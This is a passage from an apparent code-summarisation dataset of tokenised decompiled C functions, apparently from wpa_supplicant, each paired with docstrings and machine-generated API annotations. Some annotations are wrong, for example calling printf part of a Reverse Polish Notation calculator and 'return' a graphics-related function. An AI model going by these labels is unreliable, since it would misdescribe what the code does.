            "v1",
            ")",
            "{",
            "v2",
            "=",
            "v1",
            ";",
            "v3",
            "=",
            "v1",
            ";",
            "v4",
            "=",
            "0",
            ";",
            "do",
            "{",
            "if",
            "(",
            "v3",
            "-",
            ">",
            "time_remaining",
            "<",
            "v2",
            "-",
            ">",
            "time_remaining",
            ")",
            "{",
            "v4",
            "=",
            "v0",
            ";",
            "v2",
            "=",
            "v3",
            ";",
            "}",
            "v3",
            "=",
            "v3",
            "-",
            ">",
            "next",
            ";",
            "}",
            "while",
            "(",
            "v3",
            ")",
            ";",
            "current",
            "=",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "{",
            "earliestDeadlineTaskNode",
            "=",
            "v2",
            ";",
            "v1",
            "=",
            "v2",
            ";",
            "}",
            "}",
            "sleep_time",
            "=",
            "v1",
            "-",
            ">",
            "time_remaining",
            ";",
            "sleep_ms",
            "(",
            ")",
            ";",
            "v5",
            "=",
            "time_ms",
            "(",
            ")",
            ";",
            "earliestDeadlineTaskNode",
            "-",
            ">",
            "task_fn",
            "(",
            ")",
            ";",
            "v6",
            "=",
            "time_ms",
            "(",
            ")",
            ";",
            "v1",
            "=",
            "head",
            ";",
            "v7",
            "=",
            "v6",
            "-",
            "v5",
            ";",
            "current",
            "=",
            "head",
            ";",
            "run_time",
            "=",
            "v7",
            ";",
            "if",
            "(",
            "head",
            ")",
            "{",
            "v8",
            "=",
            "sleep_time",
            "+",
            "v7",
            ";",
            "v9",
            "=",
            "head",
            ";",
            "do",
            "{",
            "v9",
            "-",
            ">",
            "time_remaining",
            "-",
            "=",
            "v8",
            ";",
            "v9",
            "=",
            "v9",
            "-",
            ">",
            "next",
            ";",
            "}",
            "while",
            "(",
            "v9",
            ")",
            ";",
            "current",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "v10",
            "=",
            "!",
            "shouldRunCurrentJob",
            ";",
            "earliestDeadlineTaskNode",
            "-",
            ">",
            "time_remaining",
            "=",
            "earliestDeadlineTaskNode",
            "-",
            ">",
            "interval",
            ";",
            "}",
            "while",
            "(",
            "!",
            "v10",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function named `run_scheduler` which implements a scheduling algorithm to execute tasks based on their deadlines, updating their remaining time and intervals accordingly, with annotations missing for further context."
    },
    {
        "id": 91,
        "docstring_tokens": [
            "This",
            "code",
            "compares",
            "two",
            "constant",
            "memory",
            "regions",
            "of",
            "given",
            "length",
            "and",
            "returns",
            "the",
            "result",
            "of",
            "the",
            "bitwise",
            "XOR",
            "operation",
            "on",
            "each",
            "byte",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "unsigned",
            "__int64",
            "a3",
            ")",
            "{",
            "unsigned",
            "__int8",
            "v4",
            ";",
            "unsigned",
            "__int64",
            "i",
            ";",
            "v4",
            "=",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "i",
            "<",
            "a3",
            ";",
            "+",
            "+",
            "i",
            ")",
            "v4",
            "|",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "i",
            ")",
            "^",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "i",
            ")",
            ";",
            "return",
            "v4",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The provided code snippets suggest that the `memcmp` function is used for comparing blocks of memory, typically used to compare two buffers of bytes and returns an integer indicating their relative order, with zero meaning they are equal."
        ],
        "longer_label": "The provided code defines a custom implementation of a memory comparison function, resembling `memcmp`, used to compare blocks of memory byte by byte and returning a result indicating their relative order, with zero indicating equality."
    },
    {
        "id": 92,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "``",
            "os_snprintf",
            "''",
            "that",
            "safely",
            "formats",
            "and",
            "prints",
            "a",
            "string",
            "to",
            "a",
            "specified",
            "size",
            "while",
            "handling",
            "variadic",
            "arguments",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            "char",
            "*",
            "a1",
            ",",
            "size_t",
            "a2",
            ",",
            "const",
            "char",
            "*",
            "a3",
            ",",
            "__int64",
            "a4",
            ",",
            "__int64",
            "a5",
            ",",
            "__int64",
            "a6",
            ",",
            ".",
            ".",
            ".",
            ")",
            "{",
            "unsigned",
            "int",
            "v7",
            ";",
            "gcc_va_list",
            "arg",
            ";",
            "unsigned",
            "__int64",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "va_start",
            "(",
            "arg",
            ",",
            "a6",
            ")",
            ";",
            "v10",
            "=",
            "a4",
            ";",
            "v11",
            "=",
            "a5",
            ";",
            "v12",
            "=",
            "a6",
            ";",
            "v9",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "arg",
            "[",
            "0",
            "]",
            ".",
            "gp_offset",
            "=",
            "24",
            ";",
            "v7",
            "=",
            "vsnprintf",
            "(",
            "a1",
            ",",
            "a2",
            ",",
            "a3",
            ",",
            "arg",
            ")",
            ";",
            "if",
            "(",
            "a2",
            ")",
            "a1",
            "[",
            "a2",
            "-",
            "1",
            "]",
            "=",
            "0",
            ";",
            "return",
            "v7",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"__readfsqword\" is likely used to read a 64-bit unsigned integer from a specific offset within the FS segment register on x86 architecture, potentially to access thread-local storage or other system-specific data structures.",
            "The `vsnprintf` function is likely a variadic version of `snprintf`, intended for formatting a string with a variable number of arguments and writing the resulting string to a buffer with a specified size limit."
        ],
        "longer_label": "The provided code defines a function `os_snprintf` which formats a string according to a given format and variable arguments, writes the result to a buffer with a specified size limit, and potentially accesses thread-local storage or system-specific data using \"__readfsqword\" on x86 architecture."
    },
    {
        "id": 93,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "executes",
            "a",
            "program",
            "with",
            "arguments",
            ",",
            "waits",
            "for",
            "its",
            "completion",
            "if",
            "specified",
            ",",
            "and",
            "returns",
            "0",
            "upon",
            "successful",
            "execution",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "*",
            "a1",
            ",",
            "_BYTE",
            "*",
            "a2",
            ",",
            "int",
            "a3",
            ")",
            "{",
            "int",
            "*",
            "v3",
            ";",
            "char",
            "*",
            "v4",
            ";",
            "void",
            "*",
            "v6",
            ";",
            "int",
            "v7",
            ";",
            "char",
            "*",
            "v8",
            ";",
            "int",
            "*",
            "v9",
            ";",
            "char",
            "*",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "int",
            "v12",
            ";",
            "_BYTE",
            "*",
            "v13",
            ";",
            "char",
            "*",
            "path",
            ";",
            "int",
            "stat_loc",
            ";",
            "int",
            "v16",
            ";",
            "__pid_t",
            "pid",
            ";",
            "int",
            "v18",
            ";",
            "char",
            "*",
            "v19",
            ";",
            "__int64",
            "v20",
            ";",
            "char",
            "*",
            "*",
            "argv",
            ";",
            "char",
            "*",
            "v22",
            ";",
            "char",
            "*",
            "v23",
            ";",
            "unsigned",
            "__int64",
            "v24",
            ";",
            "path",
            "=",
            "a1",
            ";",
            "v13",
            "=",
            "a2",
            ";",
            "v12",
            "=",
            "a3",
            ";",
            "v24",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "pid",
            "=",
            "fork",
            "(",
            ")",
            ";",
            "if",
            "(",
            "pid",
            ">",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "!",
            "pid",
            ")",
            "{",
            "v18",
            "=",
            "30",
            ";",
            "v20",
            "=",
            "30L",
            "L",
            ";",
            "v6",
            "=",
            "alloca",
            "(",
            "256L",
            "L",
            ")",
            ";",
            "argv",
            "=",
            "(",
            "char",
            "*",
            "*",
            ")",
            "&",
            "v11",
            ";",
            "v22",
            "=",
            "os_strdup",
            "(",
            "path",
            ")",
            ";",
            "v23",
            "=",
            "os_strdup",
            "(",
            "v13",
            ")",
            ";",
            "*",
            "argv",
            "=",
            "v22",
            ";",
            "v16",
            "=",
            "1",
            ";",
            "v19",
            "=",
            "v23",
            ";",
            "while",
            "(",
            "v16",
            "<",
            "v18",
            "&",
            "&",
            "v19",
            "&",
            "&",
            "*",
            "v19",
            ")",
            "{",
            "while",
            "(",
            "*",
            "v19",
            "=",
            "=",
            "32",
            ")",
            "+",
            "+",
            "v19",
            ";",
            "if",
            "(",
            "!",
            "*",
            "v19",
            ")",
            "break",
            ";",
            "v7",
            "=",
            "v16",
            "+",
            "+",
            ";",
            "argv",
            "[",
            "v7",
            "]",
            "=",
            "v19",
            ";",
            "v19",
            "=",
            "os_strchr",
            "(",
            "v19",
            ",",
            "32",
            ")",
            ";",
            "if",
            "(",
            "v19",
            ")",
            "{",
            "v8",
            "=",
            "v19",
            "+",
            "+",
            ";",
            "*",
            "v8",
            "=",
            "0",
            ";",
            "}",
            "}",
            "argv",
            "[",
            "v16",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "execv",
            "(",
            "path",
            ",",
            "argv",
            ")",
            ";",
            "v9",
            "=",
            "_errno_location",
            "(",
            ")",
            ";",
            "v10",
            "=",
            "strerror",
            "(",
            "*",
            "v9",
            ")",
            ";",
            "wpa_printf",
            "(",
            "5L",
            "L",
            ",",
            "\"execv: %s\"",
            ",",
            "v10",
            ")",
            ";",
            "os_free",
            "(",
            "v22",
            ")",
            ";",
            "os_free",
            "(",
            "v23",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v12",
            ")",
            "waitpid",
            "(",
            "pid",
            ",",
            "&",
            "stat_loc",
            ",",
            "0",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "v3",
            "=",
            "_errno_location",
            "(",
            ")",
            ";",
            "v4",
            "=",
            "strerror",
            "(",
            "*",
            "v3",
            ")",
            ";",
            "wpa_printf",
            "(",
            "5L",
            "L",
            ",",
            "\"fork: %s\"",
            ",",
            "v4",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function `os_exec` that executes a specified command with arguments, handles forking a child process, and waits for the child process to finish if specified, while also providing error handling and logging capabilities."
    },
    {
        "id": 94,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "prints",
            "a",
            "timestamp",
            "in",
            "seconds",
            "and",
            "microseconds",
            "if",
            "a",
            "debug",
            "timestamp",
            "flag",
            "is",
            "set",
            ",",
            "using",
            "the",
            "current",
            "time",
            "obtained",
            "with",
            "the",
            "os_get_time",
            "function",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "__int64",
            "v1",
            ";",
            "__int64",
            "v2",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "wpa_debug_timestamp",
            ")",
            "{",
            "os_get_time",
            "(",
            "&",
            "v1",
            ")",
            ";",
            "printf",
            "(",
            "\"%ld.%06u: \"",
            ",",
            "v1",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            ")",
            ";",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v3",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __readfsqword is used to read a quadword (64 bits) value from the FS segment register on x86 architectures, allowing access to thread-local storage or other system-specific data structures.",
            "The function `os_get_time` retrieves the current time in seconds and microseconds and stores it in a structure, allowing for precise time measurements and synchronization in multi-threaded or real-time systems.",
            "The function `readfsqword` likely reads an unsigned 64-bit integer value from the FS segment register, which is commonly used in low-level programming for accessing thread-local storage or other operating system-specific data structures."
        ],
        "longer_label": "The function `wpa_debug_print_timestamp` utilizes platform-specific functions to print a timestamp with high precision, likely for debugging purposes, and returns a value representing changes in the system state."
    },
    {
        "id": 95,
        "docstring_tokens": [
            "This",
            "function",
            "prints",
            "a",
            "formatted",
            "message",
            "to",
            "various",
            "output",
            "sources",
            "based",
            "on",
            "the",
            "given",
            "log",
            "level",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ",",
            "__int64",
            "a3",
            ",",
            "__int64",
            "a4",
            ",",
            "__int64",
            "a5",
            ",",
            "__int64",
            "a6",
            ",",
            ".",
            ".",
            ".",
            ")",
            "{",
            "gcc_va_list",
            "arg",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "va_start",
            "(",
            "arg",
            ",",
            "a6",
            ")",
            ";",
            "v9",
            "=",
            "a3",
            ";",
            "v10",
            "=",
            "a4",
            ";",
            "v11",
            "=",
            "a5",
            ";",
            "v12",
            "=",
            "a6",
            ";",
            "v8",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "arg",
            "[",
            "0",
            "]",
            ".",
            "gp_offset",
            "=",
            "16",
            ";",
            "if",
            "(",
            "a1",
            ">",
            "=",
            "wpa_debug_level",
            ")",
            "{",
            "wpa_debug_print_timestamp",
            "(",
            ")",
            ";",
            "vprintf",
            "(",
            "a2",
            ",",
            "arg",
            ")",
            ";",
            "putchar",
            "(",
            "10",
            ")",
            ";",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v8",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"__readfsqword\" is likely used to read a quad-word (64 bits) value from a specific offset within the FS segment register, primarily employed in low-level system programming for accessing thread information or control structures.",
            "The function debug_print_timestampvprintf likely prints debug information along with a timestamp, using a variable argument list, to aid in debugging and tracing program execution.",
            "The function `readfsqword` likely reads a 64-bit value from the FS segment register and is typically used for low-level system programming tasks such as accessing kernel data structures or thread-local storage."
        ],
        "longer_label": "The provided code is a function `wpa_printf` that likely prints debug information with a timestamp if the debug level is sufficient, utilizing variable argument lists, and includes low-level system programming functions for accessing thread or control structures and reading 64-bit values from specific offsets within the FS segment register."
    },
    {
        "id": 96,
        "docstring_tokens": [
            "The",
            "function",
            "_wpa_hexdump",
            "prints",
            "a",
            "hexdump",
            "of",
            "a",
            "buffer",
            "with",
            "a",
            "specified",
            "title",
            ",",
            "length",
            ",",
            "and",
            "visibility",
            "to",
            "various",
            "output",
            "streams",
            "based",
            "on",
            "the",
            "debug",
            "level",
            "and",
            "settings",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ",",
            "__int64",
            "a3",
            ",",
            "unsigned",
            "__int64",
            "a4",
            ",",
            "int",
            "a5",
            ")",
            "{",
            "int",
            "result",
            ";",
            "unsigned",
            "__int64",
            "i",
            ";",
            "result",
            "=",
            "wpa_debug_level",
            ";",
            "if",
            "(",
            "a1",
            ">",
            "=",
            "wpa_debug_level",
            ")",
            "{",
            "wpa_debug_print_timestamp",
            "(",
            ")",
            ";",
            "printf",
            "(",
            "\"%s - hexdump(len=%lu):\"",
            ",",
            "a2",
            ",",
            "a4",
            ")",
            ";",
            "if",
            "(",
            "a3",
            ")",
            "{",
            "if",
            "(",
            "a5",
            ")",
            "{",
            "for",
            "(",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "i",
            "<",
            "a4",
            ";",
            "+",
            "+",
            "i",
            ")",
            "printf",
            "(",
            "\" %02x\"",
            ",",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "a3",
            "+",
            "i",
            ")",
            ")",
            ";",
            "}",
            "else",
            "{",
            "printf",
            "(",
            "\" [REMOVED]\"",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "printf",
            "(",
            "\" [NULL]\"",
            ")",
            ";",
            "}",
            "return",
            "putchar",
            "(",
            "10",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `debug_print_timestamp` appears to be intended for printing a timestamp, likely for debugging purposes, within an environment where debugging is enabled, using the provided timestamp structure `al_bp_timestamp_t`.",
            "The `printf` function in the provided code snippets seems to be a custom implementation with additional functionalities, including support for Reverse Polish Notation (RPN) calculations and specific formatting for different systems, typically used for printing formatted output to the standard output stream.",
            "The `return` function seems to be a placeholder or label for a function's name, suggesting that it should return some value or perform a specific task, possibly related to graphics rendering, device interception, or basic program execution."
        ],
        "longer_label": "The provided code is a C function `wpa_hexdump` that conditionally prints a hexadecimal dump of a memory region, possibly for debugging purposes, based on the debug level, utilizing a custom printf function for formatting, with annotations explaining the intended functionalities of the `wpa_debug_print_timestamp` function and the custom `printf` implementation."
    },
    {
        "id": 97,
        "docstring_tokens": [
            "The",
            "code",
            "prints",
            "a",
            "hexdump",
            "of",
            "the",
            "input",
            "buffer",
            "in",
            "ASCII",
            "format",
            ",",
            "with",
            "options",
            "to",
            "show",
            "or",
            "remove",
            "certain",
            "parts",
            "of",
            "the",
            "output",
            "based",
            "on",
            "the",
            "input",
            "parameters",
            "and",
            "the",
            "debug",
            "level",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ",",
            "__int64",
            "a3",
            ",",
            "unsigned",
            "__int64",
            "a4",
            ",",
            "int",
            "a5",
            ")",
            "{",
            "int",
            "result",
            ";",
            "__int64",
            "v6",
            ";",
            "unsigned",
            "__int64",
            "i",
            ";",
            "unsigned",
            "__int64",
            "j",
            ";",
            "unsigned",
            "__int64",
            "k",
            ";",
            "unsigned",
            "__int64",
            "m",
            ";",
            "__int64",
            "v14",
            ";",
            "unsigned",
            "__int64",
            "v15",
            ";",
            "v14",
            "=",
            "a3",
            ";",
            "result",
            "=",
            "wpa_debug_level",
            ";",
            "if",
            "(",
            "a1",
            ">",
            "=",
            "wpa_debug_level",
            ")",
            "{",
            "wpa_debug_print_timestamp",
            "(",
            ")",
            ";",
            "if",
            "(",
            "a5",
            ")",
            "{",
            "if",
            "(",
            "a3",
            ")",
            "{",
            "result",
            "=",
            "printf",
            "(",
            "\"%s - hexdump_ascii(len=%lu):\\n\"",
            ",",
            "a2",
            ",",
            "a4",
            ")",
            ";",
            "while",
            "(",
            "a4",
            ")",
            "{",
            "v6",
            "=",
            "16L",
            "L",
            ";",
            "if",
            "(",
            "a4",
            "<",
            "=",
            "0x10",
            ")",
            "v6",
            "=",
            "a4",
            ";",
            "v15",
            "=",
            "v6",
            ";",
            "printf",
            "(",
            "\"    \"",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "i",
            "<",
            "v15",
            ";",
            "+",
            "+",
            "i",
            ")",
            "printf",
            "(",
            "\" %02x\"",
            ",",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "v14",
            "+",
            "i",
            ")",
            ")",
            ";",
            "for",
            "(",
            "j",
            "=",
            "v15",
            ";",
            "j",
            "<",
            "0x10",
            ";",
            "+",
            "+",
            "j",
            ")",
            "printf",
            "(",
            "\"   \"",
            ")",
            ";",
            "printf",
            "(",
            "\"   \"",
            ")",
            ";",
            "for",
            "(",
            "k",
            "=",
            "0L",
            "L",
            ";",
            "k",
            "<",
            "v15",
            ";",
            "+",
            "+",
            "k",
            ")",
            "{",
            "if",
            "(",
            "(",
            "(",
            "*",
            "_ctype_b_loc",
            "(",
            ")",
            ")",
            "[",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "v14",
            "+",
            "k",
            ")",
            "]",
            "&",
            "0x4000",
            ")",
            "!",
            "=",
            "0",
            ")",
            "putchar",
            "(",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "v14",
            "+",
            "k",
            ")",
            ")",
            ";",
            "else",
            "putchar",
            "(",
            "95",
            ")",
            ";",
            "}",
            "for",
            "(",
            "m",
            "=",
            "v15",
            ";",
            "m",
            "<",
            "0x10",
            ";",
            "+",
            "+",
            "m",
            ")",
            "putchar",
            "(",
            "32",
            ")",
            ";",
            "putchar",
            "(",
            "10",
            ")",
            ";",
            "v14",
            "+",
            "=",
            "v15",
            ";",
            "result",
            "=",
            "v15",
            ";",
            "a4",
            "-",
            "=",
            "v15",
            ";",
            "}",
            "}",
            "else",
            "{",
            "return",
            "printf",
            "(",
            "\"%s - hexdump_ascii(len=%lu): [NULL]\\n\"",
            ",",
            "a2",
            ",",
            "a4",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "return",
            "printf",
            "(",
            "\"%s - hexdump_ascii(len=%lu): [REMOVED]\\n\"",
            ",",
            "a2",
            ",",
            "a4",
            ")",
            ";",
            "}",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `debug_print_tim` seems to be related to debugging in a C codebase, potentially for a Wi-Fi related software module, and likely involved in printing timestamps for debugging purposes.",
            "The `printf` function, defined and manipulated within the provided code snippets, is primarily used for formatted output to the standard output stream in C programming.",
            "Based on the function name \"\u0120\u0120hexdump_as\" and the lack of code snippets, it appears to be a function designed to generate a hexdump representation of data, likely with the ability to specify an output format or destination."
        ],
        "longer_label": "The provided C code defines a function, likely for debugging purposes in a Wi-Fi related software module, which generates a hexdump representation of data, printing both hexadecimal and ASCII representations of the data alongside optional timestamps, with conditional logic for printing or removing debug output based on the debug level."
    },
    {
        "id": 98,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "wpa_msg",
            "that",
            "takes",
            "a",
            "context",
            ",",
            "log",
            "level",
            ",",
            "format",
            "string",
            ",",
            "and",
            "variable",
            "arguments",
            ",",
            "allocates",
            "memory",
            "for",
            "a",
            "message",
            "buffer",
            ",",
            "generates",
            "a",
            "prefix",
            "based",
            "on",
            "a",
            "callback",
            "function",
            ",",
            "prints",
            "the",
            "message",
            "to",
            "the",
            "console",
            "with",
            "the",
            "prefix",
            "and",
            "buffer",
            ",",
            "and",
            "calls",
            "a",
            "callback",
            "function",
            "with",
            "the",
            "message",
            "and",
            "length",
            "before",
            "freeing",
            "the",
            "memory",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "unsigned",
            "int",
            "a2",
            ",",
            "const",
            "char",
            "*",
            "a3",
            ",",
            "__int64",
            "a4",
            ",",
            "__int64",
            "a5",
            ",",
            "__int64",
            "a6",
            ",",
            ".",
            ".",
            ".",
            ")",
            "{",
            "__int64",
            "v6",
            ";",
            "__int64",
            "v7",
            ";",
            "__int64",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "int",
            "v14",
            ";",
            "int",
            "v15",
            ";",
            "int",
            "v16",
            ";",
            "char",
            "*",
            "s",
            ";",
            "const",
            "char",
            "*",
            "v18",
            ";",
            "gcc_va_list",
            "arg",
            ";",
            "char",
            "v20",
            "[",
            "136",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v21",
            ";",
            "__int64",
            "v22",
            ";",
            "__int64",
            "v23",
            ";",
            "__int64",
            "v24",
            ";",
            "va_start",
            "(",
            "arg",
            ",",
            "a6",
            ")",
            ";",
            "v22",
            "=",
            "a4",
            ";",
            "v23",
            "=",
            "a5",
            ";",
            "v24",
            "=",
            "a6",
            ";",
            "v21",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "arg",
            "[",
            "0",
            "]",
            ".",
            "gp_offset",
            "=",
            "24",
            ";",
            "v14",
            "=",
            "vsnprintf",
            "(",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "a3",
            ",",
            "arg",
            ")",
            "+",
            "1",
            ";",
            "s",
            "=",
            "(",
            "char",
            "*",
            ")",
            "os_malloc",
            "(",
            "v14",
            ")",
            ";",
            "if",
            "(",
            "s",
            ")",
            "{",
            "va_end",
            "(",
            "arg",
            ")",
            ";",
            "va_start",
            "(",
            "arg",
            ",",
            "a6",
            ")",
            ";",
            "v20",
            "[",
            "0",
            "]",
            "=",
            "0",
            ";",
            "if",
            "(",
            "wpa_msg_ifname_cb",
            ")",
            "{",
            "v18",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "wpa_msg_ifname_cb",
            "(",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "v18",
            ")",
            "{",
            "v15",
            "=",
            "os_snprintf",
            "(",
            "v20",
            ",",
            "130L",
            "L",
            ",",
            "\"%s: \"",
            ",",
            "v18",
            ")",
            ";",
            "if",
            "(",
            "os_snprintf_error",
            "(",
            "0x82uL",
            "L",
            ",",
            "v15",
            ")",
            ")",
            "v20",
            "[",
            "0",
            "]",
            "=",
            "0",
            ";",
            "}",
            "}",
            "v16",
            "=",
            "vsnprintf",
            "(",
            "s",
            ",",
            "v14",
            ",",
            "a3",
            ",",
            "arg",
            ")",
            ";",
            "wpa_printf",
            "(",
            "a2",
            ",",
            "\"%s%s\"",
            ",",
            "(",
            "__int64",
            ")",
            "v20",
            ",",
            "(",
            "__int64",
            ")",
            "s",
            ",",
            "v10",
            ",",
            "v11",
            ")",
            ";",
            "if",
            "(",
            "wpa_msg_cb",
            ")",
            "wpa_msg_cb",
            "(",
            "a1",
            ",",
            "a2",
            ",",
            "0L",
            "L",
            ",",
            "s",
            ",",
            "v16",
            ")",
            ";",
            "bin_clear_free",
            "(",
            "s",
            ",",
            "v14",
            ")",
            ";",
            "}",
            "else",
            "{",
            "wpa_printf",
            "(",
            "5",
            ",",
            "\"wpa_msg: Failed to allocate message buffer\"",
            ",",
            "v6",
            ",",
            "v7",
            ",",
            "v8",
            ",",
            "v9",
            ")",
            ";",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v21",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `os_malloc` is part of an operating system (OS) abstraction layer and likely serves as a wrapper for memory allocation operations, providing functionality for dynamic memory allocation within the OS environment.",
            "The function `printf` in the provided code snippets is part of a larger program, likely implementing a reverse Polish notation (RPN) calculator with support for basic arithmetic operations and handling of numeric input and formatting for different systems.",
            "The `_snprintf` function is used for formatted output to a string with a specified maximum length, adhering to a printf-like syntax, and is declared with varying argument lists in the provided code snippets for different libraries or modules.",
            "The \"error\" function appears to be a part of a library or program, likely for error handling and logging purposes, as it takes a variable number of arguments (including a format string) and seems to process error messages."
        ],
        "longer_label": "The code snippet is a function for generating and printing formatted messages, handling memory allocation and OS-specific functionality, likely part of a larger program such as an operating system or other software system."
    },
    {
        "id": 99,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "wpa_msg_ctrl",
            "that",
            "takes",
            "a",
            "context",
            ",",
            "level",
            ",",
            "and",
            "format",
            "string",
            "as",
            "input",
            ",",
            "dynamically",
            "allocates",
            "memory",
            "for",
            "a",
            "message",
            "buffer",
            ",",
            "fills",
            "the",
            "buffer",
            "with",
            "formatted",
            "message",
            "data",
            ",",
            "and",
            "then",
            "calls",
            "a",
            "callback",
            "function",
            "wpa_msg_cb",
            "with",
            "the",
            "message",
            "buffer",
            "and",
            "length",
            "as",
            "arguments",
            "before",
            "freeing",
            "the",
            "memory",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "unsigned",
            "int",
            "a2",
            ",",
            "const",
            "char",
            "*",
            "a3",
            ",",
            "__int64",
            "a4",
            ",",
            "__int64",
            "a5",
            ",",
            "__int64",
            "a6",
            ",",
            ".",
            ".",
            ".",
            ")",
            "{",
            "__int64",
            "v6",
            ";",
            "__int64",
            "v7",
            ";",
            "__int64",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "int",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "char",
            "*",
            "s",
            ";",
            "gcc_va_list",
            "arg",
            ";",
            "unsigned",
            "__int64",
            "v16",
            ";",
            "__int64",
            "v17",
            ";",
            "__int64",
            "v18",
            ";",
            "__int64",
            "v19",
            ";",
            "v17",
            "=",
            "a4",
            ";",
            "v18",
            "=",
            "a5",
            ";",
            "v19",
            "=",
            "a6",
            ";",
            "v16",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "wpa_msg_cb",
            ")",
            "{",
            "va_start",
            "(",
            "arg",
            ",",
            "a6",
            ")",
            ";",
            "v12",
            "=",
            "vsnprintf",
            "(",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "a3",
            ",",
            "arg",
            ")",
            "+",
            "1",
            ";",
            "s",
            "=",
            "(",
            "char",
